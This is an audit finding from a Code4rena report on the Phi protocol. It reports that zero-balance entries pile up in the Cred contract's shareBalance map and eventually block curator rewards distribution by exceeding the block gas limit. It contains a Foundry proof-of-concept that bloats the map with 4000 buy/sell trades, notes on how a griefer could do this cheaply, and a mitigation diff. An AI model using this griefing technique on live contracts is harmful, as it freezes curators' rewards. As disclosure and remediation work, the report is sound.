---
tags:
  - lang/solidity
  - platform/code4rena
  - has/github
  - has/poc
  - severity/high
  - sector/dex
  - sector/launchpad
  - sector/options
protocol: "[[Phi]]"
auditors:
  - "[[rare_one]]"
report: "https://code4rena.com/reports/2024-08-phi"
genome:
  - "[[unbounded-loop]]"
  - "[[permanent]]"
  - "[[dos-resistance]]"
  - "[[timestamp-dependence]]"
---
# [H-03] `shareBalance` bloating eventually blocks curator rewards distribution

- id: 41089
- impact: HIGH
- protocol: [[Phi]]
- reporter: rare\_one (Code4rena)
- source: https://code4rena.com/reports/2024-08-phi

## Summary


The report discusses a bug related to the way curator share balances are tracked in the Cred contract. This data structure can hold a maximum of 999 curators, but when a curator sells all their shares, their entry remains in the structure with a zero share balance. This causes the mapping to grow unlimited, and when about 4000 different addresses own shares in a cred, the current shareholders will no longer be enumerable by the CuratorRewardsDistributor. This results in rewards distribution for the cred being blocked due to hitting the block gas limit. The report includes a proof of concept and recommended mitigation steps to remove zero entries from the map. The bug has been assessed as a DoS vulnerability with a high severity level due to the potential for permanent freezing of rewards.

## Details


Cred curator share balances are tracked by the following data structure in the `Cred`:

```solidity
    mapping(uint256 credId => EnumerableMap.AddressToUintMap balance) private shareBalance;
```

There may be `MAX_SUPPLY = 999` maximum curators of a cred. However, when a curator sells all their shares, the curator entry still remains in the data structure with a zero shares number. Because of that the mapping grows unlimited. As soon as about 4000 different addresses owned (for any time period) a cred's share, the current shareholders, regardless of their current number, will be no longer enumerable by `CuratorRewardsDistributor`. Rewards
distribution for this cred will be blocked because gas usage hits the block gas limit.

Have a look at the curator share balance update code:

```solidity
    function _updateCuratorShareBalance(uint256 credId_, address sender_, uint256 amount_, bool isBuy) internal {
        (, uint256 currentNum) = shareBalance[credId_].tryGet(sender_);

        if (isBuy) {
            if (currentNum == 0 && !_credIdExistsPerAddress[sender_][credId_]) {
                _addCredIdPerAddress(credId_, sender_);
                _credIdExistsPerAddress[sender_][credId_] = true;
            }
            shareBalance[credId_].set(sender_, currentNum + amount_);
        } else {
            if ((currentNum - amount_) == 0) {
                _removeCredIdPerAddress(credId_, sender_);
                _credIdExistsPerAddress[sender_][credId_] = false;
            }
            shareBalance[credId_].set(sender_, currentNum - amount_);
        }
    }
```

When all shares are sold by the curator, its balance is set to `0` rather than deleted from the `EnumerableMap`.

During rewards distribution, a call to `getCuratorAddresses` is made. The control goes to `_getCuratorData` function which enumerates all entries of `shareBalance[credId]`:

```solidity
        uint256 stopIndex;
        if (stop_ == 0 || stop_ > shareBalance[credId_].length()) {
            stopIndex = shareBalance[credId_].length();
        } else {
            stopIndex = stop_;
        }

        // ...
        for (uint256 i = start_; i < stopIndex; ++i) {
            (address key, uint256 shareAmount) = shareBalance[credId_].at(i);
```

Reading storage slots is quite an expensive operation nowadays. The execution will eventually hit the block gas limit and the transaction will be reverted. Details of `sload` costs and block gas limit may vary from chain to chain, but the DoS possibility never goes away.

Besides, take into account that storage access costs may increase significantly, rendering the discussed code unexecutable. Such a change may be introduced in a hardfork, e.g., the cost of the `sload` opcode was increased 10 times recently.

### Impact

If a cred is used and traded long enough (which is the intended state of the matter, presumably), the rewards of such a cred will be undistributable. Besides that, a griefing may be executed to block existing rewards (please see discussion in the PoC). Assets (rewards) of curators can be lost in that case until a code upgrade is made. If the contract was not upgradeable, that would be a high-risk situation in my opinion.

### Proof of Concept

Please insert this test into `test/CuratorRewardsDistributor.t.sol` and run with `forge test --match-test testBloatingBalances -vv --gas-limit 2000000000 --block-gas-limit 2000000000 --isolate`.

Please note:

- The PoC illustrates gas usage over 30Mgas (the current Ethereum block gas limit). Details of `sload` costs and block gas limit may vary from chain to chain.
- Higher gas limit options are needed for the initial setup of the test.
- `--isolate` option is needed to "disable" slot re-read discounts which manifest themselves since `shareBalance` slots are actively read during the setup phase.

```solidity
    function testBloatingBalances() public {
        uint256 credId = 1;
        uint256 depositAmount = 1 ether;

        // Deposit some ETH to the curatorRewardsDistributor
        curatorRewardsDistributor.deposit{ value: depositAmount }(credId, depositAmount);

        // A similar piece of code may be executed by a griefer to block rewards distribution.
        // However, instead of `vm.startPrank` he'll have to resort to lightweight proxy contracts or EIP-7702.
        // `SHARE_LOCK_PERIOD` won't be a problem since several accounts can trade shares in parallel.
        // If the cred is not far into the bonding curve, the griefing can be done cheaply.
        for (uint i = 0; i < 4000; i++) {
            address trader = address(uint160(i + 1000));
            vm.deal(trader, 0.1 ether);
            vm.startPrank(trader);
            cred.buyShareCred{value: 0.1 ether}(credId, 1, 0);
            vm.warp(block.timestamp + 10 minutes + 1 seconds);
            cred.sellShareCred(credId, 1, 0);
            vm.stopPrank();
        }

        uint gas = gasleft();
        vm.prank(user2);
        curatorRewardsDistributor.distribute(credId);
        uint gasSpend = gas - gasleft();

        console2.log("`distribute()` gas: ", gasSpend);
    }
```

### Tools Used

Foundry

### Recommended Mitigation Steps

Remove zero entries from the map:

```solidity
    function _updateCuratorShareBalance(uint256 credId_, address sender_, uint256 amount_, bool isBuy) internal {
        (, uint256 currentNum) = shareBalance[credId_].tryGet(sender_);

        if (isBuy) {
            if (currentNum == 0 && !_credIdExistsPerAddress[sender_][credId_]) {
                _addCredIdPerAddress(credId_, sender_);
                _credIdExistsPerAddress[sender_][credId_] = true;
            }
            shareBalance[credId_].set(sender_, currentNum + amount_);
        } else {
            if ((currentNum - amount_) == 0) {
                _removeCredIdPerAddress(credId_, sender_);
                _credIdExistsPerAddress[sender_][credId_] = false;
+               shareBalance[credId_].remove(sender_);
            }
+           else
                shareBalance[credId_].set(sender_, currentNum - amount_);
        }
    }
```

### Assessed type

DoS

**[ZaK3939 (Phi) confirmed and commented](https://github.com/code-423n4/2024-08-phi-findings/issues/65#issuecomment-2334761844):**
 > In addition to addressing [#188](https://github.com/code-423n4/2024-08-phi-findings/issues/188), we will add recommended steps and remove zero entries.

**[0xDjango (judge) increased severity to High and commented](https://github.com/code-423n4/2024-08-phi-findings/issues/65#issuecomment-2338853402):**
 > Upgrading to HIGH, for permanent freezing of rewards.

***
